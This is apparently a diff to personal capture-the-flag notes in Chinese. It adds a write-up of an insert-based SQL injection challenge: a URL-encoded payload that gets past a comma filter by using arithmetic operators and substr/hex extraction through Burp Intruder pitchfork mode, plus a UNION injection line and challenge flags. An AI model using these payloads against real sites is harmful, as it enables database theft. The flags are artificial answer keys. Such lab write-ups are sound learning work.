@@ -360,4 +360,13 @@ hazel{9f2da823-12fd-4ae8-acd2-2f7200071e54}
 接下来
 `1' union select group_concat(flag) from ctftraining.flag#`
 hazel{31d39468-d3d1-4f6e-b600-30cc5460453d}
-[嘤嘤嘤]sql_
+[嘤嘤嘤]sql_insertsql2
+过滤`,` `\`byd用运算符有奇效
+```
+email=3%40§1§&username=0'%2b(select%20substr(hex(hex(database()))%20from%20§1§%20for%2015))%2b'0&password=123
+```
+![[Pasted image 20240427171535.png]]用pitchfork
+登录看hex值。
+`363836313741363536433546333233333333`
+`68617A656C5F323333`
+`hazel_233`
